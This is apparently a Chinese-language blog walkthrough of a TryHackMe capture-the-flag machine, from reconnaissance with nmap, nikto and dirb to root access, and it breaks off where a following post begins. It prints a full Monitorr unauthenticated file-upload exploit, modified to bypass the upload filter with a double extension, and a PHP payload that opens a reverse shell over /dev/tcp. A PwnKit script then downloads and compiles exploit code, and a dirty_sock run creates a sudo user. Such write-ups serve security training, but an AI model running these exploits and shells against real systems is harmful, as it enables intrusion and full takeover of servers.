Linux 2.6.22 - 2.6.36 (89%), Linux 2.6.39 (89%)No exact OS matches for host (test conditions non-ideal).Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 92.96 seconds\n\n可以发现信息很多（实际上很多兔子洞），目前来看主要方向： 21端口ftp看看有无匿名登录；80和443就不用说了web渗透；8000和8096端口不知道干吗的之后看看；22和22222都是ssh端口。\n先漏扫一下吧。\nroot@ip-10-10-242-231:~# sudo nmap --script=vuln 34.240.221.73Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-03 15:46 BSTNmap scan report for ec2-34-240-221-73.eu-west-1.compute.amazonaws.com (34.240.221.73)Host is up (0.00051s latency).Not shown: 995 filtered portsPORT     STATE SERVICE21/tcp   open  ftp|_sslv2-drown: 22/tcp   open  ssh80/tcp   open  http|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.443/tcp  open  https|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-enum: |   /.gitignore: Revision control ignore file|   /config/: Potentially interesting directory w/ listing on &#x27;apache/2.4.29 (ubuntu)&#x27;|   /content/: Potentially interesting directory w/ listing on &#x27;apache/2.4.29 (ubuntu)&#x27;|   /themes/: Potentially interesting directory w/ listing on &#x27;apache/2.4.29 (ubuntu)&#x27;|_  /vendor/: Potentially interesting directory w/ listing on &#x27;apache/2.4.29 (ubuntu)&#x27;|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)|_sslv2-drown: 8000/tcp open  http-alt| http-litespeed-sourcecode-download: | Litespeed Web Server Source Code Disclosure (CVE-2010-2333)| /index.php source code:|_&lt;html lang=\\&quot;en\\&quot;&gt;&lt;head&gt;&lt;title&gt;Under Development!&lt;/title&gt;&lt;meta charset=\\&quot;utf-8\\&quot;&gt;&lt;meta name=\\&quot;viewport\\&quot; content=\\&quot;width=device-width, initial-scale=1.0\\&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Under Construction&lt;/h1&gt;&lt;h2&gt;This site is under development. Please be patient.&lt;/h2&gt;&lt;p&gt;If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. ec2-34-240-221-73.eu-west-1.compute.amazonaws.com:8000/ID_HERE)&lt;/body&gt;&lt;/html&gt;|_http-vuln-cve2013-7091: ERROR: Script execution failed (use -d to debug)|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)Nmap done: 1 IP address (1 host up) scanned in 53.23 secondsroot@ip-10-10-242-231:~# sudo nikto -h 34.240.221.73- Nikto v2.1.5---------------------------------------------------------------------------+ Target IP:          34.240.221.73+ Target Hostname:    34.240.221.73+ Target Port:        80+ Start Time:         2023-06-03 15:51:35 (GMT1)---------------------------------------------------------------------------+ Server: Apache/2.4.29 (Ubuntu)+ The anti-clickjacking X-Frame-Options header is not present.+ Root page / redirects to: https://robyns-petshop.thm/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ OSVDB-3931: /myphpnuke/links.php?op=search&amp;query=[script]alert(&#x27;Vulnerable);[/script]?query=: myphpnuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.+ OSVDB-3931: /myphpnuke/links.php?op=MostPopular&amp;ratenum=[script]alert(document.cookie);[/script]&amp;ratetype=percent: myphpnuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.+ /modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&amp;op=modload&amp;name=Members_List&amp;file=index: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host+ End Time:           2023-06-03 15:51:46 (GMT1) (11 seconds)---------------------------------------------------------------------------\n\n发现列举出了一下目录以及发现网页会重定向至https://robyns-petshop.thm/，我们把其和ip对应加到`/etc/hosts`中，不然会出现无法访问的问题。\n再dirb目录发现一下。\nroot@ip-10-10-242-231:~# sudo dirb https://34.240.221.73-----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Sat Jun  3 15:55:12 2023URL_BASE: https://34.240.221.73/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: https://34.240.221.73/ ----==&gt; DIRECTORY: https://34.240.221.73/assets/                                                                                                                                                                                                                                             + https://34.240.221.73/business (CODE:401|SIZE:461)                                                                                                                                                                                                                                     ==&gt; DIRECTORY: https://34.240.221.73/config/                                                                                                                                                                                                                                             ==&gt; DIRECTORY: https://34.240.221.73/content/                                                                                                                                                                                                                                            + https://34.240.221.73/index.php (CODE:200|SIZE:3631)                                                                                                                                                                                                                                   + https://34.240.221.73/LICENSE (CODE:200|SIZE:1085)                                                                                                                                                                                                                                     ==&gt; DIRECTORY: https://34.240.221.73/plugins/                                                                                                                                                                                                                                            + https://34.240.221.73/server-status (CODE:403|SIZE:279)                                                                                                                                                                                                                                ==&gt; DIRECTORY: https://34.240.221.73/themes/                                                                                                                                                                                                                                             ==&gt; DIRECTORY: https://34.240.221.73/vendor/                                 ---- Entering directory: https://34.240.221.73/assets/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                                                                                                                                                                                         ---- Entering directory: https://34.240.221.73/config/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                                                                                                                                                                                         ---- Entering directory: https://34.240.221.73/content/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                                                                                                                                                                                         ---- Entering directory: https://34.240.221.73/plugins/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                                                                                                                                                                                         ---- Entering directory: https://34.240.221.73/themes/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                                                                                                                                                                                         ---- Entering directory: https://34.240.221.73/vendor/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                               -----------------END_TIME: Sat Jun  3 15:55:16 2023DOWNLOADED: 4612 - FOUND: 4\n\n发现能发现一些目录，点进去也确实能看到目录中的文件。\n渗透信息收集完，每条路都依次试试吧。\nftpftp尝试匿名登录，发现登不进去，直接放弃吧。\nwebweb这边还挺花的。\n80和443端口下是一个用PicoCMS搭的网站（在网站底部可以看到是Pico搭的）。\n\n然而除了主页和contact页面以外没有别的其他信息了。当然可以通过之前目录发现的目录查看到一些文件，但总体来说也就能看出PicoCMS的版本，其他信息不是很有帮助。\n8000端口是一个说是在开发中的站点，访问需要提供授权id，随意输了几个类似root，admin，robyn等id都没能成功访问，索性先不看了。\n\n8096端口上了就是一个登录页面，尝试了几个弱密码都没成功，点击忘记密码说明是需要内部网络环境才能激活忘记密码的流程，暂时没有什么好的利用方式。也先过吧。\n\n兜兜转转回到80端口的网站处，先是在exp-db上（Attack Box 的 searchspolit不知道为啥有点问题）搜了一下PicoCMS上相关的漏洞，发现有个文件包含的漏洞，尝试了一下没有成功，可能是版本的原因，毕竟那个漏洞的pico版本比较老。\n这部分陷入了僵局，没办法了，去网上搜了下相关的workthrough，发现我遗漏了收集ssl证书信息这一步。\n确实，ssl连接浏览器一直提示有问题，是该想到去看看的，我们直接在浏览器查看网站的证书信息。\n\n我们可以发现SAN里面的DNS Name还包含了其他几个域名，我们把它们加入hosts中访问看看。\n\n我们可以发现beta和dev开头的都会指向初始的网页。而monitorr开头的网页则指向了一个新的网站。\n\nmonitorr漏洞利用从网页的底部我们可以看这个Monitorr是一个github上的开源项目，我们点进去查看可以发现其是用于管理PHP网页的。我们点击底下的Monitorr Setting会进入到管理页面。\n\n然而需要登录，简单的弱密码也登陆不了。\n不过Monitorr本身有没有漏洞可以利用呢，我们直接去exp-db上查一下，发现还真有。\n\n我们直接试试第二个，因为远程代码执行通常意味着拿shell。\n下载脚本下来运行：\nroot@ip-10-10-242-231:~# python3 48980.py https://monitorr.robyns-petshop.thm 10.10.242.231 443Traceback (most recent call last):  File &quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/connectionpool.py&quot;, line 710, in urlopen    chunked=chunked,  File &quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/connectionpool.py&quot;, line 386, in _make_request    self._validate_conn(conn)  File &quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/connectionpool.py&quot;, line 1042, in _validate_conn    conn.connect()  File &quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/connection.py&quot;, line 424, in connect    tls_in_tls=tls_in_tls,  File &quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/util/ssl_.py&quot;, line 450, in ssl_wrap_socket    sock, context, tls_in_tls, server_hostname=server_hostname  File &quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/util/ssl_.py&quot;, line 493, in _ssl_wrap_socket_impl    return ssl_context.wrap_socket(sock, server_hostname=server_hostname)  File &quot;/usr/lib/python3.6/ssl.py&quot;, line 407, in wrap_socket    _context=self, _session=session)  File &quot;/usr/lib/python3.6/ssl.py&quot;, line 817, in __init__    self.do_handshake()  File &quot;/usr/lib/python3.6/ssl.py&quot;, line 1077, in do_handshake    self._sslobj.do_handshake()  File &quot;/usr/lib/python3.6/ssl.py&quot;, line 689, in do_handshake    self._sslobj.do_handshake()ssl.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:852)During handling of the above exception, another exception occurred:Traceback (most recent call last):  File &quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/adapters.py&quot;, line 499, in send    timeout=timeout,  File &quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/connectionpool.py&quot;, line 788, in urlopen    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]  File &quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/util/retry.py&quot;, line 592, in increment    raise MaxRetryError(_pool, url, error or ResponseError(cause))urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host=&#x27;monitorr.robyns-petshop.thm&#x27;, port=443): Max retries exceeded with url: /assets/php/upload.php (Caused by SSLError(SSLError(1, &#x27;[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:852)&#x27;),))During handling of the above exception, another exception occurred:Traceback (most recent call last):  File &quot;48980.py&quot;, line 26, in &lt;module&gt;    requests.post(url, headers=headers, data=data)  File &quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/api.py&quot;, line 115, in post    return request(&quot;post&quot;, url, data=data, json=json, **kwargs)  File &quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/api.py&quot;, line 59, in request    return session.request(method=method, url=url, **kwargs)  File &quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/sessions.py&quot;, line 587, in request    resp = self.send(prep, **send_kwargs)  File &quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/sessions.py&quot;, line 701, in send    r = adapter.send(request, **kwargs)  File &quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/adapters.py&quot;, line 563, in send    raise SSLError(e, request=request)requests.exceptions.SSLError: HTTPSConnectionPool(host=&#x27;monitorr.robyns-petshop.thm&#x27;, port=443): Max retries exceeded with url: /assets/php/upload.php (Caused by SSLError(SSLError(1, &#x27;[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:852)&#x27;),))\n\n然而直接报错，错误说是ssl证书验证失败，我们直接把错误信息丢到搜索引擎查一下，发现只要把python里request请求的verify设置为False以及设置全局证书验证关闭即可，那我们改一下试一试：\n#!/usr/bin/python# -*- coding: UTF-8 -*-# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)# Date: September 12, 2020# Exploit Author: Lyhin&#x27;s Lab# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/# Software Link: https://github.com/Monitorr/Monitorr# Version: 1.7.6m# Tested on: Ubuntu 19import requestsimport osimport sysimport ssl# 关闭全局证书验证ssl._create_default_https_context = ssl._create_unverified_contextif len (sys.argv) != 4:        print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)else:    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;    headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]&#125;    data = &quot;-----------------------------31046105003900160576454225745\\r\\nContent-Disposition: form-data; name=\\&quot;fileToUpload\\&quot;; filename=\\&quot;she_ll.php\\&quot;\\r\\nContent-Type: image/gif\\r\\n\\r\\nGIF89a213213123&lt;?php shell_exec(\\&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1&#x27;\\&quot;);\\r\\n\\r\\n-----------------------------31046105003900160576454225745--\\r\\n&quot;\t#request验证关闭    requests.post(url, headers=headers, data=data, verify=False)    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;    headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;    #request验证关闭    requests.get(url, headers=headers, verify=False)\n\n开启nc监听并再次尝试运行exp发现并没有收到反弹shell，虽然提示是成功了。我们根据代码地址在/assets/data/usrimg/路径下只发现了一个usrimg.png，说明我们的反弹shell并没能成功传上去。\n我们再细看下代码，发现他是利用了/assets/php/upload.php传图片到服务器上的， 相当于利用了文件上传漏洞。我们直接访问下该网址发现有什么返回。\n\n发现报错了，错误信息提示不是图片或超过最大上传大小限制。\n那我们尝试一下用curl调试一下看看上传到底是哪里出了问题吧。我们根据exp里的上传部分构造一下curl的上传语句。\nroot@ip-10-10-242-231:~# curl -F &quot;fileToUpload=@test.png&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.phpcurl: (60) SSL certificate problem: unable to get local issuer certificateMore details here: https://curl.haxx.se/docs/sslcerts.htmlcurl failed to verify the legitimacy of the server and therefore could notestablish a secure connection to it. To learn more about this situation andhow to fix it, please visit the web page mentioned above.\n\n错误信息查了一下还是ssl证书的问题，只要加上-k跳过 SSL 检测就可以了。\nroot@ip-10-10-242-231:~# curl -k -F &quot;fileToUpload=@test.png&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php&lt;div id=&#x27;uploadreturn&#x27;&gt;You are an exploit.&lt;/div&gt;&lt;div id=&#x27;uploaderror&#x27;&gt;ERROR: test.png was not uploaded.&lt;/div&gt;&lt;/div&gt;\n\n发现又有新问题。他说我们是在exploit。很奇怪，直接访问也没显示这个错误啊。其次我这test.png就是一张图片，也不是php一句话木马，为啥会说我在exploit。\n我们回到upload.php网页用F12查看一下请求信息，看看是不是漏了什么。\n\n细看一下请求里面有cookie，内容是isHuman和PHPSESSID，难道是我们没有cookie被认为是构造的攻击？\n\n那我们就把cookie内容复制过来再试试。\nroot@ip-10-10-242-231:~# curl -k -F &quot;fileToUpload=@test.png&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php -H &quot;cookie: isHuman=1, PHPSESSID=gahu52u8e4u03qgav5hhvvku97&quot;&lt;div id=&#x27;uploadreturn&#x27;&gt;File test.png is an image: &lt;br&gt;&lt;div id=&#x27;uploadok&#x27;&gt;File test.png has been uploaded to: ../data/usrimg/test.png&lt;/div&gt;&lt;/div&gt;\n\n发现成功传上去。\n那我们构造一下我们的反弹shell，内容可以直接抄exp里面的部分GIF89a213213123&lt;?php shell_exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.242.231/8080 0&gt;&amp;1&#39;&quot;);?&gt;这样有个gif的文件头应该不会被识别出来，然而并不行，在我们尝试了双后缀和PHP大写后才成功完成上传。\nroot@ip-10-10-242-231:~# vim shell.png.PHP root@ip-10-10-242-231:~# curl -k -F &quot;fileToUpload=@shell.png.PHP&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php -H &quot;cookie: isHuman=1, PHPSESSID=gahu52u8e4u03qgav5hhvvku97&quot;&lt;div id=&#x27;uploadreturn&#x27;&gt;File shell.png.PHP is an image: &lt;br&gt;&lt;div id=&#x27;uploadok&#x27;&gt;File shell.png.PHP has been uploaded to: ../data/usrimg/shell.png.php&lt;\n\n我们直接请求上传后的地址\nroot@ip-10-10-242-231:~# curl -k https://monitorr.robyns-petshop.thm/assets/data/usrimg/shell.png.php\n\n成功拿到shell。\n修改exp当然我们测试出上传失败的原因后也可以直接修改一下exp让其能成功利用：\n#!/usr/bin/python# -*- coding: UTF-8 -*-# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)# Date: September 12, 2020# Exploit Author: Lyhin&#x27;s Lab# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/# Software Link: https://github.com/Monitorr/Monitorr# Version: 1.7.6m# Tested on: Ubuntu 19import requestsimport osimport sysimport ssl#关掉ssl证书验证ssl._create_default_https_context = ssl._create_unverified_contextif len (sys.argv) != 4:        print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)else:    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;    # headers中加入cookie    headers = &#123;&quot;cookie&quot;: &quot;isHuman=1; PHPSESSID=gahu52u8e4u03qgav5hhvvku97&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]&#125;\t# 把上传文件的名字改成双后缀并大写PHP绕过文件过滤    data = &quot;-----------------------------31046105003900160576454225745\\r\\nContent-Disposition: form-data; name=\\&quot;fileToUpload\\&quot;; filename=\\&quot;she_ll.gif.PHP\\&quot;\\r\\nContent-Type: image/gif\\r\\n\\r\\nGIF89a213213123&lt;?php shell_exec(\\&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1&#x27;\\&quot;);\\r\\n\\r\\n-----------------------------31046105003900160576454225745--\\r\\n&quot;\t    requests.post(url, headers=headers, data=data, verify=False)#关掉ssl证书验证    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.gif.php&quot;    headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;    requests.get(url, headers=headers, verify=False)#关掉ssl证书验证        \n\n也能成功拿shell。\n\nuser flag就在/var/www下，忘记截图了，自己看一下就好。\n提权登进来sudo -l和查找SUID位文件都没发现有用的，定时任务也没啥可以用的。手动遍历了下文件也没有什么信息。\n直接上linpeas把。\n[+] [CVE-2021-4034] PwnKit   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt   Exposure: probable   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main[+] [CVE-2021-3156] sudo Baron Samedit   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt   Exposure: probable   Tags: mint=19,[ ubuntu=18|20 ], debian=10   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main[+] [CVE-2021-3156] sudo Baron Samedit 2   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt   Exposure: probable   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main[+] [CVE-2018-18955] subuid_shell   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712   Exposure: probable   Tags: [ ubuntu=18.04 ]&#123;kernel:4.15.0-20-generic&#125;,fedora=28&#123;kernel:4.16.3-301.fc28&#125;   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip   Comments: CONFIG_USER_NS needs to be enabled[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/   Exposure: less probable   Tags: ubuntu=(22.04)&#123;kernel:5.15.0-27-generic&#125;   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)[+] [CVE-2022-2586] nft_object UAF   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5   Exposure: less probable   Tags: ubuntu=(20.04)&#123;kernel:5.12.13&#125;   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)[+] [CVE-2021-22555] Netfilter heap out-of-bounds write   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html   Exposure: less probable   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c   Comments: ip_tables kernel module must be loaded[+] [CVE-2019-7304] dirty_sock   Details: https://initblog.com/2019/dirty-sock/   Exposure: less probable   Tags: ubuntu=18.10,mint=19   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip   Comments: Distros use own versioning scheme. Manual verification needed.[+] [CVE-2019-18634] sudo pwfeedback   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/   Exposure: less probable   Tags: mint=19   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c   Comments: sudo configuration requires pwfeedback to be enabled.[+] [CVE-2019-15666] XFRM_UAF   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc   Exposure: less probable   Download URL:    Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled[+] [CVE-2017-5618] setuid screen v4.5.0 LPE   Details: https://seclists.org/oss-sec/2017/q1/184   Exposure: less probable   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154[+] [CVE-2017-0358] ntfs-3g-modprobe   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072   Exposure: less probable   Tags: ubuntu=16.04&#123;ntfs-3g:2015.3.14AR.1-1build1&#125;,debian=7.0&#123;ntfs-3g:2012.1.15AR.5-2.1+deb7u2&#125;,debian=8.0&#123;ntfs-3g:2014.2.15AR.2-1+deb8u2&#125;   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.\n\n因为暂时没什么好办法试试内核提权把。\npwnkit直接从https://codeload.github.com/berdav/CVE-2021-4034/zip/main下载，从里面的.sh文件拷贝内容直接在靶机创建一个exp.sh。尝试执行。\nwww-data@petshop:/tmp$ cat exp.shcat exp.sh#!/usr/bin/env shURL=https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/for EXPLOIT in &quot;$&#123;URL&#125;/cve-2021-4034.c&quot; \\               &quot;$&#123;URL&#125;/pwnkit.c&quot; \\               &quot;$&#123;URL&#125;/Makefile&quot;do    curl -sLO &quot;$EXPLOIT&quot; || wget --no-hsts -q &quot;$EXPLOIT&quot; -O &quot;$&#123;EXPLOIT##*/&#125;&quot;donemake./cve-2021-4034www-data@petshop:/tmp$ chmod 777 exp.shchmod 777 exp.shwww-data@petshop:/tmp$ ./exp.sh./exp.shcc -Wall --shared -fPIC -o pwnkit.so pwnkit.ccc -Wall    cve-2021-4034.c   -o cve-2021-4034echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modulesmkdir -p GCONV_PATH=.cp -f /bin/true GCONV_PATH=./pwnkit.so:.# whoamiwhoamiroot# ididuid=0(root) gid=0(root) groups=0(root),33(www-data)\n\n发现直接成功提权了\ndirtysock除了pwnkit，dirtysock也可以实现提权。其实dirtysock的利用脚本有两个，但是version 1的版本需要用到自己生成的rsa公钥，懒得弄了，version2可以直接创建用户更方便，就直接用version2试试，不行再用回1。\nwww-data@petshop:/tmp$ python3 ./4\tpython3 ./46362       ___  _ ____ ___ _   _     ____ ____ ____ _  _       |  \\ | |__/  |   \\_/      [__  |  | |    |_/        |__/ | |  \\  |    |   ___ ___] |__| |___ | \\_                        (version 2)//=========[]==========================================\\\\|| R&amp;D     || initstring (@init_string)                |||| Source  || https://github.com/initstring/dirty_sock |||| Details || https://initblog.com/2019/dirty-sock     ||\\\\=========[]==========================================//[+] Slipped dirty sock on random socket file: /tmp/daqnoauofi;uid=0;[+] Binding to socket file...[+] Connecting to snapd API...[+] Deleting trojan snap (and sleeping 5 seconds)...[+] Installing the trojan snap (and sleeping 8 seconds)...[+] Deleting trojan snap (and sleeping 5 seconds)...********************Success! You can now `su` to the following account and use sudo:   username: dirty_sock   password: dirty_sock********************www-data@petshop:/tmp$ su dirty_socksu dirty_socksu: must be run from a terminalwww-data@petshop:/tmp$ python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;www-data@petshop:/tmp$ su dirty_socksu dirty_sockPassword: dirty_sockTo run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.See &quot;man sudo_root&quot; for details.dirty_sock@petshop:/tmp$ ididuid=1001(dirty_sock) gid=1001(dirty_sock) groups=1001(dirty_sock),27(sudo)dirty_sock@petshop:/tmp$ sudo susudo su[sudo] password for dirty_sock: dirty_sockroot@petshop:/tmp# cd /rootcd /rootroot@petshop:~# ls -lals -latotal 24drwx------  3 root root 4096 Jun  3 18:32 .drwxr-xr-x 23 root root 4096 Apr  9  2021 ..lrwxrwxrwx  1 root root    9 Apr 10  2021 .bash_history -&gt; /dev/null-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc-rw-r--r--  1 root root  148 Aug 17  2015 .profile-r--------  1 root root   38 Apr 30  2021 root.txtdrwx------  3 root root 4096 Jun  3 18:32 snaproot@petshop:~# cat ro\tcat root.txt THM&#123;get_it_urself&#125;root@petshop:~# \n\n可以成功拿到root flag。\n","categories":["TryHackMe"],"tags":["walkthrough"]},{"title":"[vulnhub]  jarbas","url":"/2023/05/24/jarbas/","content":"\n\n\n信息收集nmap扫描\nnmap -sn主机发现\n┌──(kali㉿kali)-[~]└─$ 